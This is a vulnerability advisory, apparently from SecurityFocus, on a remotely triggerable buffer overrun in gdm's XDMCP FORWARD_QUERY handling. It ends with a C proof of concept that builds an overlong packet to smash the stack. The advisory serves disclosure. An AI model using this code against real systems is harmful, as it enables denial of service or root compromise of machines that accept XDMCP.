source: http://www.securityfocus.com/bid/1233/info

A buffer overrun exists in the XDMCP handling code used in 'gdm', an xdm replacement, shipped as part of the GNOME desktop. By sending a maliciously crafted XDMCP message, it is possible for a remote attacker to execute arbitrary commands as root on the susceptible machine. The problem lies in the handling of the display information sent as part of an XDMCP 'FORWARD_QUERY' request.

By default, gdm is not configured to listen via XDMCP. The versions of gdm shipped with RedHat 6.0-6.2, Helix GNOME and gdm built from source are not vulnerable unless they were configured to accept XDMCP requests. This is configured via the /etc/X11/gdm/gdm.conf on some systems, although this file may vary. If the "Enable" variable is set to 0, you are not susceptible. 

/*    
 * breakgdm.c - Chris Evans
 */
   
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>

int
main(int argc, const char* argv[])
{
  char deathbuf[1000];
  unsigned short s;   
  unsigned char c;    
  
  memset(deathbuf, 'A', sizeof(deathbuf));
  
  /* Write the Xdmcp header */
  /* Version */
  s = htons(1);
  write(1, &s, 2);
  /* Opcode: FORWARD_QUERY */
  s = htons(4);
  write(1, &s, 2);
  /* Length */    
  s = htons(1 + 2 + 1000 + 2);
  write(1, &s, 2);
  
  /* Now we're into FORWARD_QUERY which consists of
   * remote display, remote port, auth info. Remote display is binary
   * IP address data....
   */
  /* Remote display: 1000 A's which incidentally smoke a path
   * right to the stack
   */
  s = htons(sizeof(deathbuf));
  write(1, &s, 2);
  write(1, deathbuf, sizeof(deathbuf));
  /* Display port.. empty data will do */
  s = htons(0);
  write(1, &s, 2);
  /* Auth list.. empty data will do */
  c = 0;
  write(1, &c, 1);
} 